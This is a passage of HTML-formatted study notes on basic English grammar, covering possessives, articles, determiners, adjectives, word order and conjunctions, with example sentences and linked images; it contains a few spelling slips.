&lt;/table>
&lt;ul>
&lt;li>&lt;strong>it&lt;/strong>, &lt;strong>its&lt;/strong>, &lt;strong>it&amp;rsquo;s&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Oxford is famous for its university&lt;/code>&lt;/li>
&lt;li>&lt;code>I like Oxford. It's a nice place&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Whose&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Whose phone is this?&lt;/code>&lt;/li>
&lt;li>&lt;code>Whose are these?&lt;/code> (use &lt;strong>whose&lt;/strong> without a noun)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>a friend of mine&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Are those people friends of yours?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>by myself&lt;/strong>, &lt;strong>by themselves&lt;/strong>, &lt;strong>by yourselves&lt;/strong>
&lt;ul>
&lt;li>&lt;code>James and Sue looked at themselves&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>each other&lt;/strong>
&lt;ul>
&lt;li>&lt;code>James and Sue looked at each other&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>&amp;rsquo;s&lt;/strong>, &lt;strong>s'&lt;/strong> (for people)
&lt;ul>
&lt;li>&lt;code>My mother's umbrella&lt;/code>&lt;/li>
&lt;li>&lt;strong>friend&amp;rsquo;s&lt;/strong> and &lt;strong>friends'&lt;/strong>
&lt;ul>
&lt;li>&lt;code>My friend's car&lt;/code>&lt;/li>
&lt;li>&lt;code>My students' car&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>of &amp;hellip;&lt;/strong> (for things, places)
&lt;ul>
&lt;li>&lt;code>the roof of that building&lt;/code>&lt;/li>
&lt;li>&lt;code>the beginning of the film&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="10-a-and-the">10 A and The&lt;/h2>
&lt;p>Unit065 - Unit073&lt;/p>
&lt;h3 id="101-aan">10.1 a/an&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>a/an&lt;/strong> = one thing or person&lt;/li>
&lt;li>&lt;strong>an&lt;/strong> (not a) before &lt;strong>a/e/i/o/u&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="102-singularplural-countable-nouns">10.2 &lt;strong>singular/plural&lt;/strong> (countable nouns)&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/578ee60ce612af4fe40f99443095cb8f1627200330.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="103-countableuncountable">10.3 &lt;strong>countable/uncountable&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>You can&amp;rsquo;t use the singular alone. You need &lt;strong>a/an&lt;/strong>
&lt;ul>
&lt;li>&lt;code>We can't get into the house without a key&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>We use &lt;strong>a piece of&lt;/strong>, &lt;strong>a bottle of&lt;/strong> + &lt;em>&lt;strong>uncountable&lt;/strong>&lt;/em> noun
&lt;ul>
&lt;li>&lt;code>a bottle of water&lt;/code>, &lt;code>a carton of milk&lt;/code>, &lt;code>a bar of chocolate&lt;/code>&lt;/li>
&lt;li>&lt;code>a piece of cheese&lt;/code>, &lt;code>a bowl of rice&lt;/code>, &lt;code>a cup of tea&lt;/code>&lt;/li>
&lt;li>&lt;strong>&lt;code>a game of tennis&lt;/code>&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>We use &lt;strong>some&lt;/strong> + &lt;em>&lt;strong>plural countable nouns&lt;/strong>&lt;/em>
&lt;ul>
&lt;li>&lt;code>I need some new shoes&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>We use &lt;strong>some&lt;/strong> + &lt;em>&lt;strong>uncountable nouns&lt;/strong>&lt;/em>
&lt;ul>
&lt;li>&lt;code>I need some water&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Many nouns are sometimes countable and sometimes uncountable.
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/194989bb2ee37a87eb598d569065ba021627200928.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>be careful with
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/151251af34125d3b701d62c0fcc1b1d31627201114.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3 id="104-use-the">10.4 use &amp;ldquo;the&amp;rdquo;&lt;/h3>
&lt;ul>
&lt;li>It is clear which &lt;strong>thing&lt;/strong> or &lt;strong>person&lt;/strong> we mean
&lt;ul>
&lt;li>&lt;code>What is the name of this street&lt;/code>&lt;/li>
&lt;li>&lt;code>Who is the best player in your team?&lt;/code>&lt;/li>
&lt;li>&lt;code>Can you tell me the time, please?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>the sun, the police, the piano, the guitar, the radio, the internet
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/128823ac6e15d95bef9498f04e6fa7011627201346.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>go to the cinema/the theatre/the bank/the post office/the station/the airport/the city centre
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/62bf942c5b254c57e1b59e833f5bec221627201407.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3 id="105-dont-use-the">10.5 don&amp;rsquo;t use &amp;ldquo;the&amp;rdquo;&lt;/h3>
&lt;ul>
&lt;li>TV,breakfast/lunch/dinner, next/last + week/year
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/395fd6c47a0b630ff046a694e7434dd91627201580.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>go to work/shcool/university/hospital/prison/church/bed
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/5cdc4a37283788c24765e901b7b506661627201628.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>general ideas/games/sports/languages/school subjects
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/fb195c0cd1de2892c45098cb58f046071627201670.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>In general we don&amp;rsquo;t use &lt;strong>the&lt;/strong> with names of places&lt;/li>
&lt;/ul>
&lt;h3 id="106-the--names-of-places">10.6 the &amp;hellip; (names of places)&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/dab23d648169a2ba646b486017e143881627201963.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h2 id="11-determiners-and-pronouns">11 Determiners and Pronouns&lt;/h2>
&lt;p>Unit074 - Unit084&lt;/p>
&lt;h3 id="111-this-that-these-those">11.1 this, that, these, those&lt;/h3>
&lt;ul>
&lt;li>this(singular), that(singular)&lt;/li>
&lt;li>these(plural), those(plural)&lt;/li>
&lt;li>&lt;strong>that&lt;/strong> = something that has happened&lt;/li>
&lt;li>&lt;strong>that&lt;/strong> = what somebody has just said&lt;/li>
&lt;li>we use &lt;strong>this is&lt;/strong> and &lt;strong>is that&lt;/strong> on the phone&lt;/li>
&lt;/ul>
&lt;h3 id="112-one-ones">11.2 one, ones&lt;/h3>
&lt;ul>
&lt;li>one(singular)
&lt;ul>
&lt;li>&lt;code>Which car is yours? This one or that one?&lt;/code>&lt;/li>
&lt;li>&lt;code>I found this key. Is it the one you lost?&lt;/code>&lt;/li>
&lt;li>&lt;code>I don't like the black coat, but I like the brown one&lt;/code>&lt;/li>
&lt;li>&lt;code>This cup is dirty. Can I have a clean one?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ones(plural)
&lt;ul>
&lt;li>&lt;code>Which flowers do you want? These ones or Those ones?&lt;/code>&lt;/li>
&lt;li>&lt;code>I found these keys. Are they the ones you lost?&lt;/code>&lt;/li>
&lt;li>&lt;code>I don't like the red shoes, but I like the green ones&lt;/code>&lt;/li>
&lt;li>&lt;code>These cups are dirty. Can we have some clean ones?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="113-some-any">11.3 some, any&lt;/h3>
&lt;ul>
&lt;li>Use &lt;strong>some&lt;/strong> in positive sentences
&lt;ul>
&lt;li>&lt;code>I'm going to buy some clothes&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>use &lt;strong>any&lt;/strong> in negative sentences
&lt;ul>
&lt;li>&lt;code>I'm not going to buy any clothes&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>use &lt;strong>any&lt;/strong> in questions
&lt;ul>
&lt;li>&lt;code>Is there any milk on the firdge?&lt;/code>&lt;/li>
&lt;li>&lt;code>Does he have any friends?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>use &lt;strong>some&lt;/strong> in questions when we offer things or when we ask for things
&lt;ul>
&lt;li>&lt;code>Can I have some milk?&lt;/code>&lt;/li>
&lt;li>&lt;code>Would you like some coffee?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>some&lt;/strong> and &lt;strong>any&lt;/strong> without a noun
&lt;ul>
&lt;li>&lt;code>I didn't take any pictures, but Jessica took some.&lt;/code>&lt;/li>
&lt;li>&lt;code>You can have some coffee, but I don't want any.&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>something&lt;/strong>, &lt;strong>somebody&lt;/strong>(or &lt;strong>someone&lt;/strong>)
&lt;ul>
&lt;li>&lt;code>Would you like something to eat?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>anything&lt;/strong>, &lt;strong>anybody&lt;/strong>(or &lt;strong>anyone&lt;/strong>)
&lt;ul>
&lt;li>&lt;code>She didn't say anything&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="114-not--any-no-none">11.4 not + any, no, none&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/90483f80ac0130f90c01f4f1cc61d6851627214087.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="115-not--anybodyanyoneanything-nobodyno-onenothing-etc">11.5 not + anybody/anyone/anything, nobody/no-one/nothing (etc.)&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;/th>
&lt;th>body&lt;/th>
&lt;th>one&lt;/th>
&lt;th>thing&lt;/th>
&lt;th>where&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;strong>any&lt;/strong>&lt;/td>
&lt;td>anybody&lt;/td>
&lt;td>anyone&lt;/td>
&lt;td>anything&lt;/td>
&lt;td>anywhere&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>some&lt;/strong>&lt;/td>
&lt;td>somebody&lt;/td>
&lt;td>someone&lt;/td>
&lt;td>something&lt;/td>
&lt;td>somewhere&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>no&lt;/strong>&lt;/td>
&lt;td>nobody&lt;/td>
&lt;td>no-one&lt;/td>
&lt;td>nothing&lt;/td>
&lt;td>nowhere&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>every&lt;/strong>&lt;/td>
&lt;td>everybody&lt;/td>
&lt;td>everyone&lt;/td>
&lt;td>everything&lt;/td>
&lt;td>everywhere&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/7d401f6e21252900f0fb5fb5aea8cbbb1627214249.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="116-every-all">11.6 every, all&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>every&lt;/strong> + singular noun + singular verb
&lt;ul>
&lt;li>&lt;code>every country has a national flag&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>all&lt;/strong> + plural noun + verb
&lt;ul>
&lt;li>&lt;code>all countries have a national flag&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>every day/evening&lt;/strong> vs &lt;strong>all day/evening&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="117-all-most-some-any-nonone">11.7 all, most, some, any, no/none&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/46fa6cecd57f14fb82c06ab76c5e845e1627216355.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="118-both-either-neither">11.8 both, either, neither&lt;/h3>
&lt;ul>
&lt;li>both/either/neither (alone)
&lt;ul>
&lt;li>&lt;code>Both are married&lt;/code>, &lt;code>Either, I don't mind&lt;/code>, &lt;code>Neither&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>both/either/neither + noun
&lt;ul>
&lt;li>&lt;code>both children&lt;/code>, &lt;code>either child&lt;/code>, &lt;code>neither child&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>both of, either of, neither of&lt;/li>
&lt;/ul>
&lt;h3 id="119-a-lot-much-many">11.9 a lot, much, many&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>much&lt;/strong> + uncountable noun
&lt;ul>
&lt;li>&lt;code>Did you buy much food?&lt;/code>&lt;/li>
&lt;li>&lt;code>We don't have much luggage&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>many&lt;/strong> + countable plural noun
&lt;ul>
&lt;li>&lt;code>Did you buy many books?&lt;/code>&lt;/li>
&lt;li>&lt;code>How many pohtos did you take?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>a lot of + both type of noun
&lt;ul>
&lt;li>&lt;code>We bought a lot of food&lt;/code>&lt;/li>
&lt;li>&lt;code>We bought a lof of books&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>we use &lt;strong>much&lt;/strong> in questions and negative sentences
&lt;ul>
&lt;li>&lt;code>Do you drink much coffee?&lt;/code>&lt;/li>
&lt;li>&lt;code>I don't drink much coffee&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>But we do often us much in positive sentences
&lt;ul>
&lt;li>&lt;code>I drink a lot of coffee&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>We use &lt;strong>many&lt;/strong> and &lt;strong>a lot of&lt;/strong> in all type of sentences(positive/negative/quesitons)
&lt;code>We have many friends / a lot of friends&lt;/code>
&lt;code>We don't have many friends / a lot of friends&lt;/code>
&lt;code>Do you have many friends / a lot of friends&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="1110-a-little-a-few">11.10 (a) little, (a) few&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/9fb72594d06711b9b5da16ae688d14e11627216745.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h2 id="12-adjectives-and-adverbs">12 Adjectives and Adverbs&lt;/h2>
&lt;p>Unit085 - Unit092&lt;/p>
&lt;h3 id="121-adjectives">12.1 adjectives&lt;/h3>
&lt;ul>
&lt;li>adjective + noun
&lt;ul>
&lt;li>&lt;code>nice day&lt;/code>, &lt;code>blue eyes&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>am/is/are/was/were + adjective
&lt;ul>
&lt;li>&lt;code>These flowers are very beautiful&lt;/code>&lt;/li>
&lt;li>&lt;code>Are you cold?&lt;/code>&lt;/li>
&lt;li>&lt;code>Are you married?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>look/feel/smell/taste/sound + adjective
&lt;ul>
&lt;li>&lt;code>You look tired.&lt;/code>&lt;/li>
&lt;li>&lt;code>I'm not going to eat this fish. It doesn't smell good.&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Compare:
&lt;code>Are you married?&lt;/code> (Ask if somebody is married or not)
&lt;code>Are you getting married?&lt;/code> (Ask somebody the plan of their marriage)&lt;/p>
&lt;/blockquote>
&lt;h3 id="122-adverbs">12.2 adverbs&lt;/h3>
&lt;p>Adverbs tell you &lt;strong>how&lt;/strong> something happens or &lt;strong>how&lt;/strong> somebody does something&lt;/p>
&lt;ul>
&lt;li>&lt;strong>adjective&lt;/strong> + &lt;strong>-ly&lt;/strong> &amp;ndash;&amp;gt; &lt;strong>adverbs&lt;/strong>
&lt;ul>
&lt;li>&lt;code>quick -&amp;gt; quickly&lt;/code>&lt;/li>
&lt;li>&lt;code>bad -&amp;gt; badly&lt;/code>&lt;/li>
&lt;li>&lt;code>sudden -&amp;gt; suddenly&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>some adverbs are the same as adjectives, some are different
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/ccdb76e2ac2a16b57e256dab79870bbc1627194440.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3 id="122-adjective-comparative-forms">12.2 adjective comparative forms&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>er&lt;/strong> (1 syllable words)
&lt;ul>
&lt;li>&lt;code>old, older&lt;/code>, &lt;code>nice, nicer&lt;/code>, &lt;code>late, later&lt;/code>&lt;/li>
&lt;li>&lt;code>big, bigger&lt;/code>, &lt;code>cheap, cheaper&lt;/code>, &lt;code>easy, easier&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>more&lt;/strong> (2/3/4 syllable words)
&lt;ul>
&lt;li>&lt;code>more expensive&lt;/code>, &lt;code>more careful&lt;/code>, &lt;code>more polite&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Remember:&lt;/p>
&lt;ul>
&lt;li>far, further&lt;/li>
&lt;li>good/well, better&lt;/li>
&lt;li>bad, worse&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;ul>
&lt;li>older &lt;strong>than&lt;/strong> &amp;hellip;, more expensive &lt;strong>than&lt;/strong> &amp;hellip;
&lt;ul>
&lt;li>&lt;code>It's easier to take a taxi than to take the bus&lt;/code>&lt;/li>
&lt;li>&lt;code>Are oranges more expensive than bananas?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>more than&lt;/strong> and &lt;strong>less than&lt;/strong>
&lt;ul>
&lt;li>&lt;code>You go out more than me&lt;/code>&lt;/li>
&lt;li>&lt;code>The film was very short - less than an hour&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>a bit/much&lt;/strong> + comparative forms + &lt;strong>than&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Sue is a bit older than Joe - she's 25 and he's 24&lt;/code>&lt;/li>
&lt;li>&lt;code>You go out much more than me&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="123-not-as--as-the-same-as">12.3 not as &amp;hellip; as, the same as&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Rome is not as old as Athens&lt;/code>(Athens is older)&lt;/li>
&lt;li>&lt;code>The Grand Hotel isn't as expensive as the Europa&lt;/code>&lt;/li>
&lt;li>&lt;strong>not as much as&lt;/strong>, &lt;strong>not as many as&lt;/strong>
&lt;ul>
&lt;li>&lt;code>I don't have as much money as you&lt;/code>&lt;/li>
&lt;li>&lt;code>I don't know as many people as you&lt;/code>&lt;/li>
&lt;li>&lt;code>I don't go out as much as you&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>the same as&lt;/strong>
&lt;ul>
&lt;li>&lt;code>My hair is the same color as yours&lt;/code>&lt;/li>
&lt;li>&lt;code>The weather today is the same as yesterday&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="124-adjective-superlative-forms">12.4 adjective superlative forms&lt;/h3>
&lt;ul>
&lt;li>the &lt;strong>-est&lt;/strong>
&lt;ul>
&lt;li>&lt;code>old, the oldest&lt;/code>, &lt;code>bad, the worst&lt;/code>, &lt;code>good, the best&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>the &lt;strong>most&lt;/strong>
&lt;ul>
&lt;li>&lt;code>the most expensive&lt;/code>, &lt;code>the most careful&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>use with &lt;strong>I&amp;rsquo;ve ever&amp;hellip;&lt;/strong> / &lt;strong>you&amp;rsquo;ve ever&lt;/strong> (etc.)
&lt;ul>
&lt;li>&lt;code>I think it's the worst film I've ever seen&lt;/code>&lt;/li>
&lt;li>&lt;code>What is the most unusual thing you've ever done&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="125-enough">12.5 enough&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>enough&lt;/strong> [+ noun]
&lt;ul>
&lt;li>&lt;code>enough money&lt;/code>&lt;/li>
&lt;li>&lt;code>No, thanks. I've had enough&lt;/code>&lt;/li>
&lt;li>&lt;code>You're always at home. You don't go out enough&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>adjective + &lt;strong>enough&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Can you hear the raido? Is it loud enough for you?&lt;/code>&lt;/li>
&lt;li>&lt;code>Don't buy that coat. It's nice, but it isn't long enough&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>enough for sb/sth
&lt;ul>
&lt;li>&lt;code>I havn't got enough money for a new car&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>enough to do something
&lt;ul>
&lt;li>&lt;code>I havn't got enough money to buy a new car&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>enough for sb/sth to do something
&lt;ul>
&lt;li>&lt;code>There aren't enough chairs for everybody to sit down&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Remember: &lt;strong>enough&lt;/strong> + &lt;em>noun&lt;/em>, but &lt;em>adjective&lt;/em> + &lt;strong>enough&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/cb6b2e1029ae1f757a5eaa65256f452b1627196387.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;/blockquote>
&lt;h3 id="126-too">12.6 too&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>too&lt;/strong> + adjective/adverb
&lt;ul>
&lt;li>&lt;code>I can't work. I'm too tired&lt;/code>&lt;/li>
&lt;li>&lt;code>I think you work too hard&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>too many&lt;/strong>, &lt;strong>too much&lt;/strong>
&lt;ul>
&lt;li>&lt;code>I don't like the weather here. There is too much rain&lt;/code>&lt;/li>
&lt;li>&lt;code>Traffic is a problem in this town. There are too many cars&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>too&lt;/strong> &amp;hellip; &lt;strong>for&lt;/strong> sb/sth
&lt;ul>
&lt;li>&lt;code>These shoes are too big for me&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>too&lt;/strong> &amp;hellip; &lt;strong>to do&lt;/strong> something
&lt;ul>
&lt;li>&lt;code>I'm too tired to go out&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>too&lt;/strong> &amp;hellip; &lt;strong>for&lt;/strong> somebody &lt;strong>to do&lt;/strong> something
&lt;ul>
&lt;li>&lt;code>She speaks too fast for me to understand.&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>too&lt;/strong> vs &lt;strong>not enough&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/a7d5cf452e6fd3d7d301389a4985e5761627196786.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h2 id="13-word-order">13 Word Order&lt;/h2>
&lt;p>Uint093 - Unit096&lt;/p>
&lt;h3 id="131-subject--verb--object">13.1 subject + verb + object&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Sue bought some new shoes&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="132-where--when">13.2 where + when&lt;/h3>
&lt;ul>
&lt;li>&lt;code>I usually go to bed early&lt;/code>&lt;/li>
&lt;li>&lt;code>Will you be at home this evening&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="133-auxiliary-verb--adverb--verb">13.3 auxiliary verb + adverb + verb&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/108262bf6e3849621abb17ec4e12036f1627197010.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="134-still-yet-already">13.4 still, yet, already&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>still&lt;/strong> = something is the same as before
&lt;ul>
&lt;li>&lt;code>I had a lot to eat, but I'm still hungry&lt;/code>&lt;/li>
&lt;li>&lt;code>Do you still live in Barcelona?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>yet&lt;/strong> = unitl now
&lt;ul>
&lt;li>&lt;code>Are you ready to go yet?&lt;/code>&lt;/li>
&lt;li>&lt;code>Have you finished with the newspaper yet?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>already&lt;/strong> = earlier than expected
&lt;ul>
&lt;li>&lt;code>'What time is Joe coming?' 'He's already here'&lt;/code>&lt;/li>
&lt;li>&lt;code>Sarah isn't coming to the cinema with us. She has already seen the film&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="135-give-me-that-book-give-it-to-me">13.5 Give me that book! Give it to me&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/cc4459f1a3941e87a0ce9d530f495fdd1627197404.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;blockquote>
&lt;p>buy/get (before give, use &lt;strong>for&lt;/strong> for the reason of the action)&lt;/p>
&lt;ul>
&lt;li>&amp;ldquo;I &lt;strong>bought&lt;/strong> my monther some flowers&amp;rdquo;, but &amp;ldquo;I &lt;strong>bought&lt;/strong> some flowers &lt;strong>for&lt;/strong> my monther&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;I&amp;rsquo;m going to the shop, Can I &lt;strong>get&lt;/strong> you anything?&amp;rdquo; = &amp;ldquo;&lt;strong>get&lt;/strong> anything &lt;strong>for&lt;/strong> you&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="14-conjunctions-and-clauses">14 Conjunctions and Clauses&lt;/h2>
&lt;p>Unit097 - Unit102&lt;/p>
&lt;h3 id="141-and-but-or-so-because">14.1 and, but, or, so, because&lt;/h3>
&lt;ul>
&lt;li>We use these words to join two sentences.
&lt;ul>
&lt;li>&lt;code>I got home, had something to eat, sat down in an armchair and fell asleep&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Because&lt;/strong> is also possible at the beginning
&lt;ul>
&lt;li>&lt;code>Because it was very hot, I opened the window&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="142-when-before-while-after-until">14.2 when, before, while, after, until&lt;/h3>
&lt;ul>
&lt;li>&lt;code>when I went out, it was raining&lt;/code>&lt;/li>
&lt;li>We write a &lt;strong>&lt;code>comma(,)&lt;/code>&lt;/strong> if &lt;strong>When&lt;/strong> &amp;hellip; is at the beginning&lt;/li>
&lt;li>We use &lt;strong>the present&lt;/strong> with a future meaning after &lt;strong>when&lt;/strong>
&lt;ul>
&lt;li>&amp;ldquo;&lt;strong>When&lt;/strong> I &lt;strong>get&lt;/strong> home this evening, I&amp;rsquo;m going to have a shower&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;I&amp;rsquo;ll wait here &lt;strong>unitl&lt;/strong> you &lt;strong>come&lt;/strong> back&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="143-if">14.3 If&lt;/h3>
&lt;ul>
&lt;li>If + &lt;strong>the present&lt;/strong>
&lt;ul>
&lt;li>&lt;code>If I have time, I will go today&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>If + &lt;strong>the past&lt;/strong>, I &lt;strong>could/would&lt;/strong>
&lt;ul>
&lt;li>&lt;code>If I had time, I would go today&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="144-whothatwhich">14.4 who/that/which&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>who&lt;/strong> is for people
&lt;ul>
&lt;li>&lt;code>Do you know anybody who can play the piano?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>that&lt;/strong> is for things or people
&lt;ul>
&lt;li>&lt;code>Emma lives in a house that is 400 years old&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>which&lt;/strong> is for things
&lt;ul>
&lt;li>&lt;code>Emma lives in a house which is 400 years old&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;ul>
&lt;li>You must use &lt;strong>who/that/which&lt;/strong> when it is the subject
&lt;ul>
